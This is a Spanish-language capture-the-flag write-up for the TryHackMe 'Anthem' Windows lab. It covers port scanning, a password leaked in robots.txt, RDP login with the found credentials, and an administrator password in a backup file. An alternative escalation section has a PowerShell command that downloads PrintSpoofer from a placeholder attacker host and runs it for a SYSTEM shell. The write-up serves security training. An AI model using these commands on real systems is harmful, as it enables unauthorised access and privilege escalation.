# Writeup Anthem - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.114.153.60` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Windows |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Análisis Web y OSINT](#análisis-web-y-osint)
3. [Acceso Inicial (RDP)](#acceso-inicial-rdp)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:

```bash
nmap -sV -sC -Pn 10.113.165.48 -oN scan_anthem.txt

```

```bash
Nmap scan report for 10.113.165.48
Host is up (0.061s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Anthem.com - Welcome to our blog
| http-robots.txt: 4 disallowed entries
|_/bin/ /config/ /umbraco/ /umbraco_client/
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-26T10:52:13+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-26T10:52:09+00:00
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2026-03-25T10:48:40
|_Not valid after:  2026-09-24T10:48:40
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


---

## Análisis Web y OSINT

Al chequear el puerto 80, nos encontramos con un blog llamado Anthem. Como de primeras la página no revela mucha información, nos ponemos a indagar en sus entrañas y utilizar un poco de sentido común y OSINT:

- **Inspección del `robots.txt`**: Revisando este archivo clásico, vimos un par de directorios que no podemos listar, pero lo importante de verdad estaba más abajo, descubrimos un texto llamado "UmbracoIsTheBest!", por lo que tiene toda la pinta de ser una contraseña muy útil.

![Robots.txt](/imgAnthem/image.png)

*Contenido del archivo robots.txt mostrando directorios y nuestra preciada contraseña filtrada.*

- **Enumeración de usuarios**: Dando un paseo por los artículos del blog, identificamos que el autor responde al nombre de "SG". Ya con esto es blanco y en botella, tenemos al usuario SG y su posible clave.

![Página del equipo o autores](/imgAnthem/image2.png)
*El perfil del autor del blog revelándonos su identidad.*

- **Extracción de metadatos**: Igualmente investigamos el código fuente de la web, porque los desarrolladores siempre se dejan cosillas ocultas.

![Metadatos y Poema](/imgAnthem/image3.png)
*Y en efecto, rebuscando entre los comentarios saltaron algunos textos curiosos.*

![Panel de Umbraco](/imgAnthem/image4.png)
*Incluso pillamos el panel de control del CMS Umbraco, pero teniendo credenciales probablemente ni nos haga falta por aquí.*


---

## Acceso Inicial (RDP)

Como ya tenemos nuestras super credenciales en la mano obtenidas por nuestro OSINT casero (`SG` y `UmbracoIsTheBest!`), pasamos olímpicamente de la web y apuntamos directamente a colarnos por Escritorio Remoto (RDP), ¡a por todas!

```bash
xfreerdp /u:SG /p:'UmbracoIsTheBest!' /v:10.113.165.48 /dynamic-resolution

```

![Acceso RDP](/imgAnthem/image5.png)
*¡Estamos dentro del sistema! RDP nos abre el escritorio del usuario de buenas a primeras.*

---

## Escalada de Privilegios

Ya tenemos un pie dentro, pero desde luego no nos vamos a conformar siendo solamente un usuario raso, ¡vamos a ir a por los permisos de Administrador! En los sistemas Windows, siempre es buena idea rebuscar en cosas descartadas u olvidadas, como archivos y carpetas de copias de seguridad donde la suelen liar con los permisos.

Lo primero es obviamente habilitar la visualización de los elementos ocultos y dar una pasada exploratoria en el directorio raíz (`C:\`). 

![Búsqueda de archivos ocultos](/imgAnthem/image6.png)
*Habilitamos los benditos archivos ocultos y vemos una carpeta muy sospechosa llamada "backup" en la raíz.*

Aprovechamos que es nuestro día de suerte y entramos de cabeza en nuestra mina de oro: `C:\backup`.

![Carpeta Backup](/imgAnthem/image7.png)
*Investigamos la carpeta para ver por qué hay un registro oculto de restauración.*

Revisando lo que hay dentro descubrimos un archivo llamado `restore.txt`. ¡BINGO! Alguien por pereza dejó en texto plano la contraseña original del ansiado Administrador de la máquina.

![Contraseña Administrador](/imgAnthem/image8.png)

*Ahí la tenemos, la clave en texto plano dejada como si nada.*

Sabiendo esta grandísima contraseña de Administrador, tan solo nos conectamos u abrimos el CMD como admin y la máquina pasa a ser nuestra.

### Alternativa: Escalada con PrintSpoofer

Si en otro escenario de la misma máquina conseguimos una shell con un usuario de servicio (por ejemplo `iis apppool\defaultapppool`) y tenemos habilitado `SeImpersonatePrivilege`, también podemos escalar con [PrintSpoofer](https://github.com/itm4n/PrintSpoofer):

```cmd
whoami /priv
```

Podemos ver que tenemos el privilegio `SeImpersonatePrivilege` habilitado. Básicamente esto significa que podemos "hacernos pasar" por otro usuario del sistema, incluido el todopoderoso `NT AUTHORITY\SYSTEM`. Para aprovecharnos de eso usaremos PrintSpoofer, una herramienta que abusa del servicio de impresión de Windows para forzar a SYSTEM a conectarse a un canal que nosotros controlamos, y en ese momento le robamos el token de autenticación.

1. Montamos un servidor HTTP simple en nuestra máquina atacante, en la carpeta donde está `PrintSpoofer64.exe`:
	```bash
	python3 -m http.server 8000
	```
2. En la máquina víctima abrimos PowerShell, descargamos el binario a una ruta temporal y lo ejecutamos:
	```powershell
	cd $env:TEMP
	Invoke-WebRequest http://IP_ATACANTE:8000/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe
	.\PrintSpoofer64.exe -i -c powershell.exe
	```
3. Si todo va bien, se abre una consola con token de SYSTEM y al comprobarlo con `whoami` veremos `NT AUTHORITY\SYSTEM`.

---

## Flags

### Flag de Usuario (user.txt)

Al colarnos directamente por escritorio remoto en nuestra llegada, la flag no podía ser más obvia y estaba en el escritorio de SG esperándonos.

![User Flag](/imgAnthem/image5.png)
*Contenido del archivo user.txt recuperado del escritorio.*

### Flag de Root (root.txt)

Y de postre, tras elevarnos a Administrador por la tremenda liada del texto en plano, subimos a la cuenta top y recogemos la flag del root sin despeinarnos mucho.

![Root Flag](/imgAnthem/image9.png)
*Con los permisos al máximo, capturamos nuestra última flag y damos la máquina por finalizada.*
